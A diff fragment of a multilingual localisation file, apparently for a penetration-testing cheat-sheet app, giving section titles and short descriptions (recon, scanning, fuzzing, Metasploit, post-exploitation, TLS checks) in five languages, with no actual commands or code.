+        "section1CommandDesc": {"en": "Commands gather domain info, DNS records, HTTP headers, and passive certificate/host data.", "ru": "Команды собирают информацию о домене, DNS-записи, заголовки HTTP и пассивные данные сертификатов/хостов.", "he": "פקודות לאיסוף פרטי דומיין, רשומות DNS, כותרות HTTP ונתוני אישור/מארח פסיביים.", "fr": "Les commandes recueillent des informations de domaine, des enregistrements DNS, des en-têtes HTTP et des données passives de certificat/hôte.", "de": "Befehle erfassen Domäneninformationen, DNS-Einträge, HTTP-Header und passive Zertifikats-/Hostdaten."},
 
-  // SECTION 4: Subdomain & DNS Enumeration
-  "section4Title": {"en": "4) Subdomain & DNS Enumeration", "ru": "4) Перечисление субдоменов и DNS", "he": "4) אינומרציית דומיינים ו-DNS", "fr": "4) Énumération de sous-domaines et DNS", "de": "4) Subdomain- & DNS-Aufzählung"},
-  "section4Desc": {"en": "Discovering subdomains and advanced DNS records using specialized tools.", "ru": "Обнаружение субдоменов и расширенных DNS-записей с помощью специализированных инструментов.", "he": "גילוי תתי-דומיינים ורשומות DNS מתקדמות באמצעות כלים מיוחדים.", "fr": "Découverte de sous-domaines et d'enregistrements DNS avancés à l'aide d'outils spécialisés.", "de": "Entdeckung von Subdomains und erweiterten DNS-Einträgen mittels spezialisierter Tools."},
-  "section4CommandDesc": {"en": "Uses Amass and Subfinder for comprehensive target scope, combining passive and active sources.", "ru": "Использует Amass и Subfinder для комплексной области целей, объединяя пассивные и активные источники.", "he": "משתמש ב-Amass וב-Subfinder לכיסוי יעד מקיף, המשלב מקורות פסיביים ואקטיביים.", "fr": "Utilise Amass et Subfinder pour une portée cible complète, combinant des sources passives et actives.", "de": "Verwendet Amass und Subfinder für einen umfassenden Zielbereich, der passive und aktive Quellen kombiniert."},
-  
-  // SECTION 5: Port & Service Discovery
-  "section5Title": {"en": "5) Port & Service Discovery", "ru": "5) Обнаружение портов и служб", "he": "5) גילוי פורטים ושירותים", "fr": "5) Découverte de ports et services", "de": "5) Port- & Service-Erkennung"},
-  "section5Desc": {"en": "Aggressive port scanning, service versioning, and banner grabbing.", "ru": "Агрессивное сканирование портов, определение версий служб и захват баннеров.", "he": "סריקת פורטים אגרסיבית, גרסאות שירות ואיסוף באנרים.", "fr": "Scan de ports agressif, versionnage de services et capture de bannières.", "de": "Aggressives Port-Scanning, Service-Versionierung und Banner Grabbing."},
-  "section5CommandDesc": {"en": "The Nmap command is a safe, thorough pattern: default scripts, service versions, all ports, fast timing, and output formats.", "ru": "Команда Nmap - безопасный, тщательный шаблон: скрипты по умолчанию, версии служб, все порты, быстрое время и форматы вывода.", "he": "פקודת Nmap היא דפוס בטוח ומקיף: סקריפטים ברירת מחדל, גרסאות שירות, כל הפורטים, תזמון מהיר ופורמטי פלט.", "fr": "La commande Nmap est un modèle sûr et complet : scripts par défaut, versions de service, tous les ports, minutage rapide et formats de sortie.", "de": "Der Nmap-Befehl ist ein sicheres, gründliches Muster: Standard-Skripte, Service-Versionen, alle Ports, schnelles Timing und Ausgabeformate."},
+        // SECTION 2: Recon: Search Engine Dorking & Exposed Assets
+        "section2Title": { "en": "2) Recon: Search Engine Dorking & Exposed Assets", "ru": "2) Разведка: Доркинг поисковых систем и открытые активы", "he": "2) סיור: דורקינג מנועי חיפוש ונכסים חשופים", "fr": "2) Dorking et Actifs Exposés", "de": "2) Suchmaschinen-Dorking & Exposed Assets" },
+        "section2Desc": { "en": "Using advanced search operators (Dorks) on Google, Bing, and Yandex to discover exposed files, directories, and misconfigurations.", "ru": "Использование расширенных операторов поиска (Дорков) для обнаружения открытых файлов, каталогов и неверных конфигураций.", "he": "שימוש באופרטורי חיפוש מתקדמים (דורקים) לגילוי קבצים, ספריות ותצורות שגויות שנחשפו.", "fr": "Utilisation d'opérateurs de recherche avancés (Dorks) pour découvrir des fichiers, répertoires et erreurs de configuration exposés.", "de": "Verwendung erweiterter Suchoperatoren (Dorks) zur Entdeckung exponierter Dateien, Verzeichnisse und Fehlkonfigurationen." },
+        "section2CommandDesc": { "en": "These dorks work across all major search engines and are crucial for external reconnaissance.", "ru": "Эти дорки работают во всех основных поисковых системах и критически важны для внешней разведки.", "he": "דורקים אלו עובדים בכל מנועי החיפוש העיקריים והם חיוניים לסיור חיצוני.", "fr": "Ces dorks fonctionnent sur tous les principaux moteurs de recherche et sont cruciaux pour la reconnaissance externe.", "de": "Diese Dorks funktionieren auf allen gängigen Suchmaschinen und sind entscheidend für die externe Aufklärung." },
 
-  // SECTION 6: Web Discovery & Fuzzing
-  "section6Title": {"en": "6) Web Discovery & Fuzzing", "ru": "6) Веб-обнаружение и фаззинг", "he": "6) גילוי ופאזינג של ווב", "fr": "6) Découverte Web et Fuzzing", "de": "6) Web-Entdeckung & Fuzzing"},
-  "section6Desc": {"en": "Bruteforcing directories, files, and virtual hosts.", "ru": "Перебор каталогов, файлов и виртуальных хостов методом перебора.", "he": "כוח גס (Bruteforcing) על ספריות, קבצים ומארחים וירטואליים.", "fr": "Bruteforcing de répertoires, fichiers et hôtes virtuels.", "de": "Bruteforcing von Verzeichnissen, Dateien und virtuellen Hosts."},
-  "section6CommandDesc": {"en": "Uses ffuf and gobuster for content discovery, filtering for common success status codes (200, 301, 302).", "ru": "Использует ffuf и gobuster для обнаружения контента, фильтруя общие коды состояния успеха (200, 301, 302).", "he": "משתמש ב-ffuf וב-gobuster לגילוי תוכן, סינון לפי קודי סטטוס הצלחה נפוצים (200, 301, 302).", "fr": "Utilise ffuf et gobuster pour la découverte de contenu, en filtrant les codes d'état de succès courants (200, 301, 302).", "de": "Verwendet ffuf und gobuster zur Inhaltserkennung, Filterung nach gängigen Erfolgsstatuscodes (200, 301, 302)."},
+        // SECTION 3: SEO & Indexation Security
+        "section3Title": { "en": "3) SEO & Indexation Security", "ru": "3) Безопасность SEO и индексации", "he": "3) אבטחת SEO ואינדוקס", "fr": "3) Sécurité SEO et Indexation", "de": "3) SEO- & Indexierungssicherheit" },
+        "section3Desc": { "en": "Testing for misconfigurations in robots.txt, meta tags, and canonical URLs that lead to unintended data exposure or duplicate content issues.", "ru": "Проверка на неверные конфигурации в robots.txt, мета-тегах и канонических URL-адресах, которые могут привести к непреднамеренному раскрытию данных.", "he": "בדיקת תצורות שגויות ב-robots.txt, תגי מטא וכתובות URL קנוניות שעלולות להוביל לחשיפת נתונים לא מכוונת.", "fr": "Test des erreurs de configuration dans robots.txt, les balises meta et les URL canoniques qui entraînent une exposition involontaire des données.", "de": "Überprüfung auf Fehlkonfigurationen in robots.txt, Meta-Tags und kanonischen URLs, die zu unbeabsichtigter Datenexposition führen." },
+        "section3CommandDesc": { "en": "These checks help find security issues caused by poor communication between developers and search engine crawlers.", "ru": "Эти проверки помогают выявить проблемы безопасности, вызванные плохой коммуникацией между разработчиками и поисковыми роботами.", "he": "בדיקות אלו מסייעות במציאת בעיות אבטחה שנגרמות מתקשורת לקויה בין מפתחים לסורקי מנועי חיפוש.", "fr": "Ces vérifications aident à trouver des problèmes de sécurité causés par une mauvaise communication entre les développeurs et les robots des moteurs de recherche.", "de": "Diese Prüfungen helfen, Sicherheitsprobleme zu finden, die durch schlechte Kommunikation zwischen Entwicklern und Suchmaschinen-Crawlern verursacht werden." },
 
-  // SECTION 7: Web Application Testing
-  "section7Title": {"en": "7) Web Application Testing", "ru": "7) Тестирование веб-приложений", "he": "7) בדיקת יישומי ווב", "fr": "7) Test d'applications Web", "de": "7) Webanwendungstests"},
-  "section7Desc": {"en": "Quick vulnerability checks for SQLi and XSS, plus basic HTTP diagnostics.", "ru": "Быстрые проверки уязвимостей SQLi и XSS, а также базовая HTTP-диагностика.", "he": "בדיקות פגיעות מהירות עבור SQLi ו-XSS, בתוספת אבחון HTTP בסיסי.", "fr": "Vérifications rapides des vulnérabilités SQLi et XSS, plus diagnostics HTTP de base.", "de": "Schnelle Schwachstellenprüfungen für SQLi und XSS, plus grundlegende HTTP-Diagnose."},
-  "section7CommandDesc": {"en": "Tools for checking common application layer flaws and enumerating hidden parameters.", "ru": "Инструменты для проверки общих недостатков уровня приложений и перечисления скрытых параметров.", "he": "כלים לבדיקת פגמים נפוצים בשכבת היישום ולאינומרציה של פרמטרים נסתרים.", "fr": "Outils pour vérifier les défauts courants de la couche application et énumérer les paramètres cachés.", "de": "Tools zur Überprüfung gängiger Schwachstellen der Anwendungsschicht und zur Aufzählung versteckter Parameter."},
+        // SECTION 4: Subdomain & DNS Enumeration
+        "section4Title": { "en": "4) Subdomain & DNS Enumeration", "ru": "4) Перечисление субдоменов и DNS", "he": "4) אינומרציית דומיינים ו-DNS", "fr": "4) Énumération de sous-domaines et DNS", "de": "4) Subdomain- & DNS-Aufzählung" },
+        "section4Desc": { "en": "Discovering subdomains and advanced DNS records using specialized tools.", "ru": "Обнаружение субдоменов и расширенных DNS-записей с помощью специализированных инструментов.", "he": "גילוי תתי-דומיינים ורשומות DNS מתקדמות באמצעות כלים מיוחדים.", "fr": "Découverte de sous-domaines et d'enregistrements DNS avancés à l'aide d'outils spécialisés.", "de": "Entdeckung von Subdomains und erweiterten DNS-Einträgen mittels spezialisierter Tools." },
+        "section4CommandDesc": { "en": "Uses Amass and Subfinder for comprehensive target scope, combining passive and active sources.", "ru": "Использует Amass и Subfinder для комплексной области целей, объединяя пассивные и активные источники.", "he": "משתמש ב-Amass וב-Subfinder לכיסוי יעד מקיף, המשלב מקורות פסיביים ואקטיביים.", "fr": "Utilise Amass et Subfinder pour une portée cible complète, combinant des sources passives et actives.", "de": "Verwendet Amass und Subfinder für einen umfassenden Zielbereich, der passive und aktive Quellen kombiniert." },
 
-  // SECTION 8: Vulnerability Scanning & SCA
-  "section8Title": {"en": "8) Vulnerability Scanning & SCA", "ru": "8) Сканирование уязвимостей и SCA", "he": "8) סריקת פגיעויות ו-SCA", "fr": "8) Scan de vulnérabilités et SCA", "de": "8) Schwachstellenscan & SCA"},
-  "section8Desc": {"en": "Automated vulnerability template scanning, SBOM generation, and analysis.", "ru": "Автоматизированное сканирование шаблонов уязвимостей, создание и анализ SBOM.", "he": "סריקת תבניות פגיעות אוטומטית, יצירת SBOM (שטר חומרת תוכנה) וניתוח.", "fr": "Scan automatisé de modèles de vulnérabilité, génération et analyse de SBOM.", "de": "Automatisiertes Scannen von Schwachstellen-Templates, SBOM-Generierung und -Analyse."},
-  "section8CommandDesc": {"en": "Uses open-source tools for infrastructure scanning (Nuclei) and dependency analysis (Syft/Grype).", "ru": "Использует инструменты с открытым исходным кодом для сканирования инфраструктуры (Nuclei) и анализа зависимостей (Syft/Grype).", "he": "משתמש בכלים בקוד פתוח לסריקת תשתית (Nuclei) וניתוח תלות (Syft/Grype).", "fr": "Utilise des outils open source pour le scan d'infrastructure (Nuclei) et l'analyse de dépendances (Syft/Grype).", "de": "Verwendet Open-Source-Tools für Infrastruktur-Scans (Nuclei) und Abhängigkeitsanalyse (Syft/Grype)."},
+        // SECTION 5: Port & Service Discovery
+        "section5Title": { "en": "5) Port & Service Discovery", "ru": "5) Обнаружение портов и служб", "he": "5) גילוי פורטים ושירותים", "fr": "5) Découverte de ports et services", "de": "5) Port- & Service-Erkennung" },
+        "section5Desc": { "en": "Aggressive port scanning, service versioning, and banner grabbing.", "ru": "Агрессивное сканирование портов, определение версий служб и захват баннеров.", "he": "סריקת פורטים אגרסיבית, גרסאות שירות ואיסוף באנרים.", "fr": "Scan de ports agressif, versionnage de services et capture de bannières.", "de": "Aggressives Port-Scanning, Service-Versionierung und Banner Grabbing." },
+        "section5CommandDesc": { "en": "The Nmap command is a safe, thorough pattern: default scripts, service versions, all ports, fast timing, and output formats.", "ru": "Команда Nmap - безопасный, тщательный шаблон: скрипты по умолчанию, версии служб, все порты, быстрое время и форматы вывода.", "he": "פקודת Nmap היא דפוס בטוח ומקיף: סקריפטים ברירת מחדל, גרסאות שירות, כל הפורטים, תזמון מהיר ופורמטי פלט.", "fr": "La commande Nmap est un modèle sûr et complet : scripts par défaut, versions de service, tous les ports, minutage rapide et formats de sortie.", "de": "Der Nmap-Befehl ist ein sicheres, gründliches Muster: Standard-Skripte, Service-Versionen, alle Ports, schnelles Timing und Ausgabeformate." },
 
-  // SECTION 9: Passwords, Credentials & AD Tooling
-  "section9Title": {"en": "9) Passwords, Credentials & AD Tooling", "ru": "9) Пароли, учетные данные и инструменты AD", "he": "9) סיסמאות, אישורים וכלי AD", "fr": "9) Mots de passe, Identifiants & Outils AD", "de": "9) Passwörter, Anmeldeinformationen & AD-Tools"},
-  "section9Desc": {"en": "Online bruteforce (authorized only), offline hash cracking, and Active Directory enumeration tools.", "ru": "Онлайн-перебор (только с разрешения), автономный взлом хешей и инструменты перечисления Active Directory.", "he": "כוח גס מקוון (באישור בלבד), פיצוח Hash לא מקוון וכלי אינומרציית Active Directory.", "fr": "Bruteforce en ligne (autorisé uniquement), cassage de hash hors ligne et outils d'énumération Active Directory.", "de": "Online-Bruteforce (nur autorisiert), Offline-Hash-Cracking und Active Directory-Aufzählungstools."},
-  "section9CommandDesc": {"en": "Standard tools for credential testing, hash cracking, and AD environment assessment.", "ru": "Стандартные инструменты для тестирования учетных данных, взлома хешей и оценки среды AD.", "he": "כלים סטנדרטיים לבדיקת אישורים, פיצוח Hash והערכת סביבת AD.", "fr": "Outils standards pour le test d'identifiants, le cassage de hash et l'évaluation de l'environnement AD.", "de": "Standard-Tools für Anmeldeinformationstests, Hash-Cracking und AD-Umgebungsbewertung."},
+        // SECTION 6: Web Discovery & Fuzzing
+        "section6Title": { "en": "6) Web Discovery & Fuzzing", "ru": "6) Веб-обнаружение и фаззинг", "he": "6) גילוי ופאזינג של ווב", "fr": "6) Découverte Web et Fuzzing", "de": "6) Web-Entdeckung & Fuzzing" },
+        "section6Desc": { "en": "Bruteforcing directories, files, and virtual hosts.", "ru": "Перебор каталогов, файлов и виртуальных хостов методом перебора.", "he": "כוח גס (Bruteforcing) על ספריות, קבצים ומארחים וירטואליים.", "fr": "Bruteforcing de répertoires, fichiers et hôtes virtuels.", "de": "Bruteforcing von Verzeichnissen, Dateien und virtuellen Hosts." },
+        "section6CommandDesc": { "en": "Uses ffuf and gobuster for content discovery, filtering for common success status codes (200, 301, 302).", "ru": "Использует ffuf и gobuster для обнаружения контента, фильтруя общие коды состояния успеха (200, 301, 302).", "he": "משתמש ב-ffuf וב-gobuster לגילוי תוכן, סינון לפי קודי סטטוס הצלחה נפוצים (200, 301, 302).", "fr": "Utilise ffuf et gobuster pour la découverte de contenu, en filtrant les codes d'état de succès courants (200, 301, 302).", "de": "Verwendet ffuf und gobuster zur Inhaltserkennung, Filterung nach gängigen Erfolgsstatuscodes (200, 301, 302)." },
 
-  // SECTION 10: Exploitation: Metasploit Framework (MSF)
-  "section10Title": {"en": "10) Exploitation: Metasploit Framework (MSF)", "ru": "10) Эксплуатация: Metasploit Framework (MSF)", "he": "10) ניצול: Metasploit Framework (MSF)", "fr": "10) Exploitation: Metasploit Framework (MSF)", "de": "10) Exploit: Metasploit Framework (MSF)"},
-  "section10Desc": {"en": "Core Metasploit commands for searching, configuring, and executing exploits.", "ru": "Основные команды Metasploit для поиска, настройки и выполнения эксплойтов.", "he": "פקודות Metasploit ליבה לחיפוש, קביעת תצורה וביצוע ניצולים.", "fr": "Commandes Metasploit de base pour la recherche, la configuration et l'exécution d'exploits.", "de": "Kern-Metasploit-Befehle zum Suchen, Konfigurieren und Ausführen von Exploits."},
-  "section10CommandDesc": {"en": "A template workflow for using auxiliary and exploit modules in the Metasploit console.", "ru": "Шаблон рабочего процесса для использования вспомогательных модулей и модулей эксплойтов в консоли Metasploit.", "he": "תבנית עבודה לשימוש במודולים עזר וניצול בקונסולת Metasploit.", "fr": "Un flux de travail modèle pour l'utilisation de modules auxiliaires et d'exploitation dans la console Metasploit.", "de": "Ein Template-Workflow zur Verwendung von Hilfs- und Exploit-Modulen in der Metasploit-Konsole."},
+        // SECTION 7: Web Application Testing
+        "section7Title": { "en": "7) Web Application Testing", "ru": "7) Тестирование веб-приложений", "he": "7) בדיקת יישומי ווב", "fr": "7) Test d'applications Web", "de": "7) Webanwendungstests" },
+        "section7Desc": { "en": "Quick vulnerability checks for SQLi and XSS, plus basic HTTP diagnostics.", "ru": "Быстрые проверки уязвимостей SQLi и XSS, а также базовая HTTP-диагностика.", "he": "בדיקות פגיעות מהירות עבור SQLi ו-XSS, בתוספת אבחון HTTP בסיסי.", "fr": "Vérifications rapides des vulnérabilités SQLi et XSS, plus diagnostics HTTP de base.", "de": "Schnelle Schwachstellenprüfungen für SQLi und XSS, plus grundlegende HTTP-Diagnose." },
+        "section7CommandDesc": { "en": "Tools for checking common application layer flaws and enumerating hidden parameters.", "ru": "Инструменты для проверки общих недостатков уровня приложений и перечисления скрытых параметров.", "he": "כלים לבדיקת פגמים נפוצים בשכבת היישום ולאינומרציה של פרמטרים נסתרים.", "fr": "Outils pour vérifier les défauts courants de la couche application et énumérer les paramètres cachés.", "de": "Tools zur Überprüfung gängiger Schwachstellen der Anwendungsschicht und zur Aufzählung versteckter Parameter." },
 
-  // SECTION 11: Post-Exploitation: Shells & Enumeration
-  "section11Title": {"en": "11) Post-Exploitation: Shells & Enumeration", "ru": "11) Пост-эксплуатация: Шелы и перечисление", "he": "11) פוסט-ניצול: מעטפות ואינומרציה", "fr": "11) Post-Exploitation: Shells et Énumération", "de": "11) Post-Exploit: Shells & Aufzählung"},
-  "section11Desc": {"en": "Listener commands, common reverse shell one-liners, and local privilege escalation helpers.", "ru": "Команды слушателя, общие однострочники обратной оболочки и помощники по повышению локальных привилегий.", "he": "פקודות Listener, שורות פקודה נפוצות של מעטפת הפוכה ועוזרי הרחבת הרשאות מקומיות.", "fr": "Commandes d'écoute, one-liners courants de reverse shell et aides à l'escalade de privilèges locaux.", "de": "Listener-Befehle, gängige Reverse-Shell-One-Liner und Helfer zur lokalen Privilegienerweiterung."},
-  "section11CommandDesc": {"en": "Essential commands for establishing and maintaining remote access and internal host reconnaissance.", "ru": "Основные команды для установления и поддержания удаленного доступа и внутренней разведки хостов.", "he": "פקודות חיוניות ליצירה ותחזוקה של גישה מרחוק וסיור מארח פנימי.", "fr": "Commandes essentielles pour établir et maintenir l'accès à distance et la reconnaissance d'hôtes internes.", "de": "Wesentliche Befehle zur Einrichtung und Aufrechterhaltung des Fernzugriffs und der internen Host-Aufklärung."},
+        // SECTION 8: Vulnerability Scanning & SCA
+        "section8Title": { "en": "8) Vulnerability Scanning & SCA", "ru": "8) Сканирование уязвимостей и SCA", "he": "8) סריקת פגיעויות ו-SCA", "fr": "8) Scan de vulnérabilités et SCA", "de": "8) Schwachstellenscan & SCA" },
+        "section8Desc": { "en": "Automated vulnerability template scanning, SBOM generation, and analysis.", "ru": "Автоматизированное сканирование шаблонов уязвимостей, создание и анализ SBOM.", "he": "סריקת תבניות פגיעות אוטומטית, יצירת SBOM (שטר חומרת תוכנה) וניתוח.", "fr": "Scan automatisé de modèles de vulnérabilité, génération et analyse de SBOM.", "de": "Automatisiertes Scannen von Schwachstellen-Templates, SBOM-Generierung und -Analyse." },
+        "section8CommandDesc": { "en": "Uses open-source tools for infrastructure scanning (Nuclei) and dependency analysis (Syft/Grype).", "ru": "Использует инструменты с открытым исходным кодом для сканирования инфраструктуры (Nuclei) и анализа зависимостей (Syft/Grype).", "he": "משתמש בכלים בקוד פתוח לסריקת תשתית (Nuclei) וניתוח תלות (Syft/Grype).", "fr": "Utilise des outils open source pour le scan d'infrastructure (Nuclei) et l'analyse de dépendances (Syft/Grype).", "de": "Verwendet Open-Source-Tools für Infrastruktur-Scans (Nuclei) und Abhängigkeitsanalyse (Syft/Grype)." },
 
-  // SECTION 12: Network & TLS Checks
-  "section12Title": {"en": "12) Network & TLS Checks", "ru": "12) Проверки сети и TLS", "he": "12) בדיקות רשת ו-TLS", "fr": "12) Vérifications Réseau et TLS", "de": "12) Netzwerk- & TLS-Prüfungen"},
-  "section12Desc": {"en": "Traffic capture, packet analysis, and SSL/TLS configuration checks.", "ru": "Захват трафика, анализ пакетов и проверка конфигурации SSL/TLS.", "he": "לכידת תעבורה, ניתוח מנות ובדיקות תצורת SSL/TLS.", "fr": "Capture de trafic, analyse de paquets et vérifications de configuration SSL/TLS.", "de": "Verkehrserfassung, Paketanalyse und SSL/TLS-Konfigurationsprüfungen."},
-  "section12CommandDesc": {"en": "Commands for network diagnostics and assessing the cryptographic strength of web endpoints.", "ru": "Команды для сетевой диагностики и оценки криптографической стойкости веб-конечных точек.", "he": "פקודות לאבחון רשת והערכת החוזק הקריפטוגרפי של נקודות קצה אינטרנט.", "fr": "Commandes pour le diagnostic réseau et l'évaluation de la force cryptographique des points de terminaison Web.", "de": "Befehle zur Netzwerkdiagnose und zur Bewertung der kryptografischen Stärke von Web-Endpunkten."},
+        // SECTION 9: Passwords, Credentials & AD Tooling
+        "section9Title": { "en": "9) Passwords, Credentials & AD Tooling", "ru": "9) Пароли, учетные данные и инструменты AD", "he": "9) סיסמאות, אישורים וכלי AD", "fr": "9) Mots de passe, Identifiants & Outils AD", "de": "9) Passwörter, Anmeldeinformationen & AD-Tools" },
+        "section9Desc": { "en": "Online bruteforce (authorized only), offline hash cracking, and Active Directory enumeration tools.", "ru": "Онлайн-перебор (только с разрешения), автономный взлом хешей и инструменты перечисления Active Directory.", "he": "כוח גס מקוון (באישור בלבד), פיצוח Hash לא מקוון וכלי אינומרציית Active Directory.", "fr": "Bruteforce en ligne (autorisé uniquement), cassage de hash hors ligne et outils d'énumération Active Directory.", "de": "Online-Bruteforce (nur autorisiert), Offline-Hash-Cracking und AD-Aufzählungstools." },
+        "section9CommandDesc": { "en": "Standard tools for credential testing, hash cracking, and AD environment assessment.", "ru": "Стандартные инструменты для тестирования учетных данных, взлома хешей и оценки среды AD.", "he": "כלים סטנדרטיים לבדיקת אישורים, פיצוח Hash והערכת סביבת AD.", "fr": "Outils standards pour le test d'identifiants, le cassage de hash et l'évaluation de l'environnement AD.", "de": "Standard-Tools für Anmeldeinformationstests, Hash-Cracking und AD-Umgebungsbewertung." },
 
-  // SECTION 13: Vulnerability Research & PoC Triage
-  "section13Title": {"en": "13) Vulnerability Research & PoC Triage", "ru": "13) Исследование уязвимостей и сортировка PoC", "he": "13) מחקר פגיעויות וטריאז' PoC", "fr": "13) Recherche de Vulnérabilités et Tri PoC", "de": "13) Schwachstellenforschung & PoC-Triage"},
-  "section13Desc": {"en": "Searching local exploit databases and safely running proof-of-concept code in isolation.", "ru": "Поиск локальных баз данных эксплойтов и безопасное выполнение кода подтверждения концепции в изоляции.", "he": "חיפוש בבסיסי נתונים מקומיים של ניצולים והרצת קוד הוכחת היתכנות (PoC) בבידוד בבטחה.", "fr": "Recherche dans les bases de données d'exploits locales et exécution sécurisée de code de preuve de concept en isolement.", "de": "Suche in lokalen Exploit-Datenbanken und sichere Ausführung von Proof-of-Concept-Code in Isolation."},
-  "section13CommandDesc": {"en": "Emphasizes local search (searchsploit) and the use of network-isolated containers to prevent lateral movement.", "ru": "Подчеркивает локальный поиск (searchsploit) и использование сетевых изолированных контейнеров для предотвращения горизонтального перемещения.", "he": "מדגיש חיפוש מקומי (searchsploit) ושימוש במכולות מבודדות רשת למניעת תנועה רוחבית.", "fr": "Met l'accent sur la recherche locale (searchsploit) et l'utilisation de conteneurs isolés du réseau pour prévenir les mouvements latéraux.", "de": "Betont die lokale Suche (searchsploit) und die Verwendung von netzwerkisolierten Containern zur Verhinderung von lateralen Bewegungen."},
+        // SECTION 10: Exploitation: Metasploit Framework (MSF)
+        "section10Title": { "en": "10) Exploitation: Metasploit Framework (MSF)", "ru": "10) Эксплуатация: Metasploit Framework (MSF)", "he": "10) ניצול: Metasploit Framework (MSF)", "fr": "10) Exploitation: Metasploit Framework (MSF)", "de": "10) Exploit: Metasploit Framework (MSF)" },
+        "section10Desc": { "en": "Core Metasploit commands for searching, configuring, and executing exploits.", "ru": "Основные команды Metasploit для поиска, настройки и выполнения эксплойтов.", "he": "פקודות Metasploit ליבה לחיפוש, קביעת תצורה וביצוע ניצולים.", "fr": "Commandes Metasploit de base pour la recherche, la configuration et l'exécution d'exploits.", "de": "Kern-Metasploit-Befehle zum Suchen, Konfigurieren und Ausführen von Exploits." },
+        "section10CommandDesc": { "en": "A template workflow for using auxiliary and exploit modules in the Metasploit console.", "ru": "Шаблон рабочего процесса для использования вспомогательных модулей и модулей эксплойтов в консоли Metasploit.", "he": "תבנית עבודה לשימוש במודולים עזר וניצול בקונסולת Metasploit.", "fr": "Un flux de travail modèle pour l'utilisation de modules auxiliaires et d'exploitation dans la console Metasploit.", "de": "Ein Template-Workflow zur Verwendung von Hilfs- und Exploit-Modulen in der Metasploit-Konsole." },
 
-  // SECTION 14: Binary Reversing & Exploit Development
-  "section14Title": {"en": "14) Binary Reversing & Exploit Development", "ru": "14) Реверсирование бинарных файлов и разработка эксплойтов", "he": "14) הנדסה הפוכה ופיתוח ניצול", "fr": "14) Rétro-ingénierie binaire et développement d'exploits", "de": "14) Binär-Reverse-Engineering & Exploit-Entwicklung"},
-  "section14Desc": {"en": "Static analysis (ELF), ROP gadget hunting, and interactive debugging setup.", "ru": "Статический анализ (ELF), поиск ROP-гаджетов и настройка интерактивной отладки.", "he": "ניתוח סטטי (ELF), ציד גאדג'טים של ROP והגדרת ניפוי באגים אינטראקטיבי.", "fr": "Analyse statique (ELF), chasse aux gadgets ROP et configuration de débogage interactif.", "de": "Statische Analyse (ELF), ROP-Gadget-Suche und interaktives Debugging-Setup."},
-  "section14CommandDesc": {"en": "Tools used for analyzing executable file headers, assembly code, and preparing buffer overflow exploits.", "ru": "Инструменты, используемые для анализа заголовков исполняемых файлов, кода ассемблера и подготовки эксплойтов переполнения буфера.", "he": "כלים המשמשים לניתוח כותרות קבצים ניתנים להרצה, קוד אסמבלי והכנת ניצול גלישת חוצץ.", "fr": "Outils utilisés pour analyser les en-têtes de fichiers exécutables, le code assembleur et préparer des exploits de dépassement de tampon.", "de": "Tools zur Analyse von Header-Dateien, Assembly-Code und zur Vorbereitung von Buffer-Overflow-Exploits."},
+        // SECTION 11: Post-Exploitation: Shells & Enumeration
+        "section11Title": { "en": "11) Post-Exploitation: Shells & Enumeration", "ru": "11) Пост-эксплуатация: Шелы и перечисление", "he": "11) פוסט-ניצול: מעטפות ואינומרציה", "fr": "11) Post-Exploitation: Shells et Énumération", "de": "11) Post-Exploit: Shells & Aufzählung" },
+        "section11Desc": { "en": "Listener commands, common reverse shell one-liners, and local privilege escalation helpers.", "ru": "Команды слушателя, общие однострочники обратной оболочки и помощники по повышению локальных привилегий.", "he": "פקודות Listener, שורות פקודה נפוצות של מעטפת הפוכה ועוזרי הרחבת הרשאות מקומיות.", "fr": "Commandes d'écoute, one-liners courants de reverse shell et aides à l'escalade de privilèges locaux.", "de": "Listener-Befehle, gängige Reverse-Shell-One-Liner und Helfer zur lokalen Privilegienerweiterung." },
+        "section11CommandDesc": { "en": "Essential commands for establishing and maintaining remote access and internal host reconnaissance.", "ru": "Основные команды для установления и поддержания удаленного доступа и внутренней разведки хостов.", "he": "פקודות חיוניות ליצירה ותחזוקה של גישה מרחוק וסיור מארח פנימי.", "fr": "Commandes essentielles pour établir et maintenir l'accès à distance et la reconnaissance d'hôtes internes.", "de": "Wesentliche Befehle zur Einrichtung und Aufrechterhaltung des Fernzugriffs und der internen Host-Aufklärung." },
 
-  // SECTION 15: Fuzzing
-  "section15Title": {"en": "15) Fuzzing", "ru": "15) Фаззинг", "he": "15) פאזינג", "fr": "15) Fuzzing", "de": "15) Fuzzing"},
-  "section15Desc": {"en": "Instrumented binary fuzzing and HTTP request fuzzing for input discovery.", "ru": "Инструментированный фаззинг бинарных файлов и фаззинг HTTP-запросов для обнаружения ввода.", "he": "פאזינג בינארי מונחה ופאזינג בקשות HTTP לגילוי קלט.", "fr": "Fuzzing binaire instrumenté et fuzzing de requêtes HTTP pour la découverte d'entrées.", "de": "Instrumentiertes Binär-Fuzzing und HTTP-Anfrage-Fuzzing zur Eingabeerkennung."},
-  "section15CommandDesc": {"en": "AFL is used for finding crashes in C/C++ binaries; Wfuzz is used for black-box web fuzzing.", "ru": "AFL используется для поиска сбоев в бинарных файлах C/C++; Wfuzz используется для фаззинга черного ящика веб-приложений.", "he": "AFL משמש למציאת קריסות בבינארי C/C++; Wfuzz משמש לפאזינג קופסה שחורה של ווב.", "fr": "AFL est utilisé pour trouver des crashs dans les binaires C/C++; Wfuzz est utilisé pour le fuzzing Web en boîte noire.", "de": "AFL wird zur Fehlersuche in C/C++-Binärdateien verwendet; Wfuzz wird für Black-Box-Web-Fuzzing eingesetzt."},
+        // SECTION 12: Network & TLS Checks
+        "section12Title": { "en": "12) Network & TLS Checks", "ru": "12) Проверки сети и TLS", "he": "12) בדיקות רשת ו-TLS", "fr": "12) Vérifications Réseau et TLS", "de": "12) Netzwerk- & TLS-Prüfungen" },
+        "section12Desc": { "en": "Traffic capture, packet analysis, and SSL/TLS configuration checks.", "ru": "Захват трафика, анализ пакетов и проверка конфигурации SSL/TLS.", "he": "לכידת תעבורה, ניתוח מנות ובדיקות תצורת SSL/TLS.", "fr": "Capture de trafic, analyse de paquets et vérifications de configuration SSL/TLS.", "de": "Verkehrserfassung, Paketanalyse und SSL/TLS-Konfigurationsprüfungen." },
+        "section12CommandDesc": { "en": "Commands for network diagnostics and assessing the cryptographic strength of web endpoints.", "ru": "Команды для сетевой диагностики и оценки криптографической стойкости веб-конечных точек.", "he": "פקודות לאבחון רשת והערכת החוזק הקריפטוגרפי של נקודות קצה אינטרנט.", "fr": "Commandes pour le diagnostic réseau et l'évaluation de la force cryptographique des points de terminaison Web.", "de": "Befehle zur Netzwerkdiagnose und zur Bewertung der kryptografischen Stärke von Web-Endpunkten." },
 
-  // SECTION 16: Mobile & Firmware Analysis
